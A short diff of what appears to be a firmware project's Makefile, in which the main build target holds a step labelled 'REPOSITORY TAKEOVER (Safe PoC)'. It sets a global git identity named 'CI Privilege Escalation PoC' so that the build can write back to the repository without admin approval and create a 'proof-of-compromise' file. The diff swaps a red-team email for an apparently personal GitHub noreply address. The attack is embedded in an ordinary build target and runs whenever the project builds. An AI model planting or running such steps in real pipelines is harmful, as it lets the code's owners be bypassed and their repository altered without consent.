@@ -99,7 +99,7 @@ main-build: firmware.elf secondary-outputs
 	@echo "[6] EXECUTION: REPOSITORY TAKEOVER (Safe PoC)"
 	@# Proving we can write back to the repo without admin approval
 	@echo "Configuring git identity..."
-	@git config --global user.email "redteam@42porto.com"
+	@git config --global user.email " 259360238+Or3nturo@users.noreply.github.com"
 	@git config --global user.name "CI Privilege Escalation PoC"
 	
 	@echo "Creating proof-of-compromise file..."
